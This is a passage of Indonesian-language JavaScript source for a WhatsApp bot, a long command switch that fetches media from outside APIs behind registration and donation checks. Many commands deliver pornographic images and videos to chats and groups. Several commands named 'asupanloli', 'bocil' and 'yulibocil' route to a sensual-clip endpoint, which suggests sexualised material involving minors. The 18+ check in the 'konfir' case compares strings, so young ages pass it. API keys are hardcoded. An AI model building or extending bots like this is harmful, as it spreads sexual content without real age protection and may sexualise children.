		Revoer.sendMessage(from, anu, audio, { mimetype: 'audio/mp4', quoted: mek ,ptt : true})
		break
//══════════[ FITUR ASUPAN ]══════════//
/*Nyolong case ?
kasih credit ajg / tambah in di tqtq
--> RevoerGans*/

case 'asupan':
case 'asupanloli':
case 'bocil':
case 'rikagusriani':
case 'santuy':
case 'ukhty':
case 'gheayubi':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/asupan/${command}?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
		break

	case 'bacol':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		kon = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=XonTolAmaT`)
		buffer = await getBuffer(kon.result)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [
			{
				buttonId: `${prefix}bacol`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break
	case 'penyegar':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		tod = await fetchJson(`https://rest-beni.herokuapp.com/api/asupan`)
		buffer = await getBuffer(tod.result)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [
			{
				buttonId: `${prefix}penyegar`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break
case 'hijaber':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/asupan/hijaber?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
		break

	case 'hentaivid':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply('Anda Bukan Premium Heyyy,Donasi Dulu Yuk Ntar Bisa Ngocox Sepuasnya')
		reply('Tunggu Bentar..Lama Tidaknya Tergantung WebServer')
		nih = await getBuffer(`https://zenzapi.xyz/downloader/hentaivid2?apikey=LuOlangNgentot`)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, nih, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break

	case 'tiktokporn':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply('Anda Bukan Premium Heyyy,Donasi Dulu Yuk Ntar Bisa Ngocox Sepuasnya')
		reply('[❗] Tunggu Bentar..Lama Tidaknya Tergantung WebServer\nDan abila tidak merespon dalam 5 menit,harap ketik ulang command')
		nih = await getBuffer(`https://zenzapi.xyz/downloader/tikporn2?apikey=LuOlangNgentot`)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, nih, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break
	
//══════════[ FITUR CECAN ]══════════//
/*Nyolong case ?
kasih credit ajg / tambah in di tqtq
--> RevoerGans*/

case 'cecan':
case 'cogan':
case 'cecan2':
case 'cogan2':
case 'jeni':
case 'jiso':
case 'justina':
case 'lisa':
case 'rose':
case 'ryujin':
case 'indonesia':
case 'vietnam':
case 'thailand':
case 'korea':
case 'china':
case 'japan':
case 'malaysia':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/cecan/${command}?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
		break

	case 'cersex':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		Revoer.sendMessage(from, `Maaf,Ini Fitur 18+\nSilahkan Konfirmasi Usia Anda Dengan Cara Ketik #konfir (usia)`, text, { quoted: mek })
		break

	case 'konfir':
		tod = args.join(" ")
		if (args.length < 1) {
			reply('Masukan Usia Anda')
        }
		if ((args[0]) < '18') {
			Revoer.sendMessage(from, `Maaf Usia Anda Tidak Mencukupi`, text, { quoted: mek })
		} else {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			buffer = await fetchJson(`https://api-helgazex.herokuapp.com/api/cersex?apikey=kUCiJDhU`)
			mek = buffer.result
			Teks = `${mek.judul}\n\n${mek.cersex}\n\n Klik Next Untuk Ke Cersex Selanjutnya`
			sendButMessage(from, Teks, `*_${tanggal} - ${time} WIB_*`, [
				{
					buttonId: `${prefix + command}`,
					buttonText: {
						displayText: `NEXT`,
					},
					type: 1,
				},
			]);
        }
		break
//══════════[ RANDOM TEXT ]══════════//
/*Nyolong case ?
kasih credit ajg / tambah in di tqtq
--> RevoerGans*/

case 'pantun':
case 'puisi':
case 'faktaunik':
case 'katabijak':
case 'katailham':
case 'katasindiran':
case 'katabucin':
case 'katabucin2':
case 'kataml':
case 'katagalau':
case 'katagombal':
case 'quotesislami':
case 'quotesanime':
case 'quotesdilan':
case 'quotesff':
case 'quotespubg':
case 'quoteshacker':
case 'truth':
case 'dare':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
		oke = await fetchJson(`https://apidhani.herokuapp.com/api/randomtext/${command}?apikey=${dhakey}`)
yh = (oke.result.message)
sendButMessage(from, yh, `Klik Untuk Ke ${command} Selanjutnya`, [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `ɴᴇxᴛ`,
},
type: 1,
},]);
		break;
	case 'faktahorror':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		oke = await fetchJson(`https://zenzapi.xyz/api/creepyfact?apikey=${zenz}`)
		bileck = (oke.result.message)
		sendButMessage(from, bileck , `Klik Untuk Ke ${command} Selanjutnya`, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `ɴᴇxᴛ`,
				},
				type: 1,
			},]);
		break;

	case 'jagokata':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Masukan Query')
		oke = await fetchJson(`https://zenzapi.xyz/api/jagokata?query=${q}&apikey=${zenz}`)
		bileck = (oke.result.message)
		sendButMessage(from, bileck, `Klik Untuk Ke ${command} Selanjutnya`, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `ɴᴇxᴛ`,
				},
				type: 1,
			},]);
		break;

case 'quotes':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
anu = await fetchJson(`https://apidhani.herokuapp.com/api/randomtext/quotes?apikey=${dhakey}`)
dhani = (anu.result.quotes)
sendButMessage(from, dhani, `Klik Untuk Ke Quotes Selanjutnya`, [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `ɴᴇxᴛ`,
},
type: 1,
},]);
break;
case 'quoteskanye':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
anu = await fetchJson(`https://apidhani.herokuapp.com/api/randomtext/quotes/kanye?apikey=${dhakey}`)
dhani = (anu.result.text_id)
sendButMessage(from, dhani, `Klik Untuk Ke Quotes Selanjutnya`, [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `ɴᴇxᴛ`,
},
type: 1,
},]);
break;
	
//══════════[ RANDOM IMAGE ]══════════//
/*Nyolong case ?
kasih credit ajg / tambah in di tqtq
--> RevoerGans*/

case 'ppcp':
case 'ppcouple':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
		anu = await fetchJson(`https://api.lolhuman.xyz/api/random/ppcouple?apikey=${LolKey}`)
cowo = await getBuffer(anu.result.male)
Cowok = `_Ini cowoknya_`
sendButImage(from, Cowok, `*_${tanggal} - ${time} WIB_*`, cowo, [                      
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
cewe = await getBuffer(anu.result.female)
Cewek = `_Ini ceweknya_`
sendButImage(from, Cewek, `*_${tanggal} - ${time} WIB_*`, cewe, [                      
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
break
case 'meme':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		buffer = await getBuffer(`https://zenzapi.xyz/api/random/meme?apikey=${zenz}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
		break

	case 'cosplayer':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		buffer = await getBuffer(`https://zenzapi.xyz/api/random/cosplay?apikey=${zenz}`)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break

case 'wallpaperhacker':
case 'wallpaperhacker2':
case 'wallpaperharley':
case 'wallpaperjoker':
case 'wallpaperpubg':
case 'wallpaperhp':
case 'wallpaperhp2':
case 'wallpaperkpop':
case 'wallpaperblackpink':
case 'wallpapergame':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/randomimage/${command}?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
break
case 'quotesimage':
case 'katakataimage':
case 'renungan':
	case 'memeindo':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		buffer = await getBuffer(`https://zenzapi.xyz/api/random/memeindo?apikey=${zenz}`)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break
case 'aesthetic':
case 'yulibocil':
case 'doraemon':
case 'pokemon':
case 'pentol':
case 'tatasurya':
case 'kartun':
case 'anjing':
case 'kucing':
case 'satanic':
case 'boneka':
case 'mobil':
case 'motor':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/randomimage/${command}?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
break
case 'darkjoker':
case 'darkjokes':
case 'darkjokers':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/randomimage/darkjokes?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
break

//----> FITUR ANIME <----//

case 'waifu':
case 'neko':
case 'naruto':
case 'loli':
case 'husbu':
case 'milf':
case 'cosplay':
case 'nekonime':
case 'shota':
case 'wallml':
case 'akira':
case 'akiyama':
case 'ana':
case 'asuna':
case 'ayuzawa':
case 'boruto':
case 'chiho':
case 'chitoge':
case 'deidara':
case 'eba':
case 'elaina':
case 'emilia':
case 'erza':
case 'gremory':
case 'hestia':
case 'hinata':
case 'isuzu':
case 'itachi':
case 'itori':
case 'kagura':
case 'kakasih':
case 'kaori':
case 'kaneki':
case 'kotori':
case 'kurumi':
case 'madara':
case 'mikasa':
case 'miku':
case 'minato':
case 'nezuko':
case 'rize':
case 'sagiri':
case 'sakura':
case 'sasuke':
case 'shina':
case 'shinka':
case 'shinomiya':
case 'shizuka':
case 'tejina':
case 'toukachan':
case 'tsunade':
case 'yotsuba':
case 'yuki':
case 'yumeko':
case 'fanart':
case 'nino':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/anime/${command}?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
break
	case 'ass':
	case 'ahegao':
	case 'bdsm':
	case 'blowjob':
	case 'cuckold':
	case 'cum':
	case 'ero':
	case 'femdom':
	case 'foot':
	case 'gangbang':
	case 'glasses':
	case 'hentai':
	case 'jahy':
	case 'masturbation':
	case 'neko':
	case 'orgy':
	case 'panties':
	case 'pussy':
	case 'thighs':
	case 'yuri':
	case 'mobilewall':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isGroup) return reply('MENU KHUSUS GRUP,MASUKIN BOT KE GRUP DULU DEK 😎')
		if(!isDonasi) return reply('Anda Bukan Premium Heyyy,Donasi Dulu Yuk Ntar Bisa Ngocox Sepuasnya')
		if (!isNsfw) return reply(mess.only.nsfw)
		anu = await getBuffer(`https://zenzapi.xyz/api/morensfw/${command}?apikey=${zenz}`)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButImage(from, Teks, `*_${tanggal} - ${time} WIB_*`, anu, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break

//══════════[ RANDOM VIDEO ]══════════//

case 'beatvn':
case 'jedagjedugff':
case 'jedagjedugml':
case 'jedagjedugpubg':
case 'storyanime':
case 'storywa':
case 'storygalau':
case 'storytruk':
	case 'storybus':
		case'storysholawatan':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
buffer = await getBuffer(`https://apidhani.herokuapp.com/api/randomvideo/${command}?apikey=${dhakey}`)
Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
},
]);
		break

	case 'randombokep':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Waduh Lagi Engas Yak? Donasi Dulu Yuk Seikhlasnya ke Owner,Biar Bisa Akses Fitur Premium Lainya :)`)
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		buffer = await getBuffer(`https://apidhani.herokuapp.com/api/randomvideo/bokep?apikey=${dhakey}`)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break

	

	case 'clipclap':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		buffer = await getBuffer(`https://kuhong-api.herokuapp.com/api/clipclaps?apikey=${hong}`)
		Teks = `Klik Next Untuk Ke ${command} Selanjutnya`
		sendButVideo(from, Teks, `*_${tanggal} - ${time} WIB_*`, buffer, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `NEXT`,
				},
				type: 1,
			},
		]);
		break

	case 'citacita':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		buffer = await getBuffer(`https://pecundang.herokuapp.com/api/citacita`)
		Revoer.sendMessage(from, buffer, audio, {mimetype:'audio/mp4',quoted : fvoc,ptt : true})
		break

	case 'fancytext':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		cy = await fetchJson(`https://pecundang.herokuapp.com/api/fancytext?teks=${q}`)
		get = cy.result
		Revoer.sendMessage(from, get, text, { quoted: mek})
		break

//══════════[ FITUR MAKER ]══════════//
/*Nyolong case ?
kasih credit ajg / tambah in di tqtq
--> RevoerGans*/


//----> 1 TEXT <----//

case 'blackpink':
case 'halloween':
case 'halloween2':
case '3dgradient':
case 'naturalleaves':
case 'dropwater':
case 'blood':
case 'blood2':
case 'snow':
case 'cloud':
case 'neondevil':
case 'neon':
case 'glowingneonlight':
case 'neonlight':
case 'neonlight2':
case 'neonlight3':
case 'greenneon':
case 'toxic':
case 'matrix':
case 'thunder':
case 'thunder2':
case 'bokeh':
case 'carbontext':
case 'christmas':
case 'breakwall':
case 'roadwarning':
case 'engraved3d':
case 'embossed':
case '3dstone':
case 'futuristic':
case 'sketch':
case 'bluecircuit':
case 'space':
case 'magmahot':
case 'artpapercut':
case '3dluxurygold':
case 'robotr2d2':
case 'harrypotter':
case 'glitch3':
case 'greenhorror':
case 'horrorgift':
case 'hotmetal':
case 'erodedmetal':
case '3dglowingmetal':
case 'blackmetal':
case 'bluemetal':
case 'shynimetal':
case 'rustymetal':
case 'metalpurple':
case 'metalrainbow':
case 'metaldarkgold':
case 'colorfullluxurymetal':
case 'glossybluemetal':
case '3dglossymetal':
case 'metallic':
case 'glossymetallic':
case 'christmastree':
case 'sparklesmerrychristmas':
case 'countryflag3d':
case 'americanflag3d':
case '3dscfi':
case '3drainbow':
case '3dwaterpipe':
case '3dchrome':
case 'bluegem':
case 'purplegem':
case 'pinkcandy':
case 'transformer':
case 'berry':
case 'brokenglass':
case '3drealistic':
case '3dunderwater':
case 'writeinsandsummerbeach':
case 'sandwriting':
case 'foilballoon':
case '3dglue':
case '1917':
case 'minion':
case 'doubleexposure':
case 'holographic3d':
case 'deluxegold':
case 'deluxesilver':
case 'glossycarbon':
case 'fabric':
case 'xmascards3d':
case 'wicker':
case 'fireworksparkle':
case 'skeleton':
case 'ultragloss':
case 'denim':
case 'decorategreen':
case 'peridot':
case 'rock':
case 'lava':
case 'rainbowequalizer':
case 'purpleglass':
case 'decorativeglass':
case 'chocolatecake':
case 'strawberry':
case 'koifish':
case 'bread':
case '3dbox':
case 'freeadvancedglow':
case 'honey':
case 'marble':
case 'marbleslabs':
case 'icecold':
case 'fruitjuice':
case 'abstragold':
case 'biscuit':
case 'bagel':
case 'wood':
case 'hexagolden':
case '3ddeepseametal':
case 'leddisplayscreen':
case 'wonderfulgraffitiart':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/${command}?apikey=${dhakey}&text=${teks}`)
oke = await getBuffer(anu.result)
Revoer.sendMessage(from, oke, image, {mimetype:'image/jpeg',quoted: mek, caption: '*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*'})
break
case 'hartatahta': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
teks = args.join(" ")
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
harta = await getBuffer(`https://apidhani.herokuapp.com/api/maker/harta-tahta?apikey=${dhakey}&text=${teks}`)
Revoer.sendMessage(from, harta, image, {mimetype:'image/jpeg',quoted: mek, caption: '*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*'})
break

//----> 2 TEXT <----//

case '8bit':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/8bit?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'pornhub':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/pornhub?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'glitch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
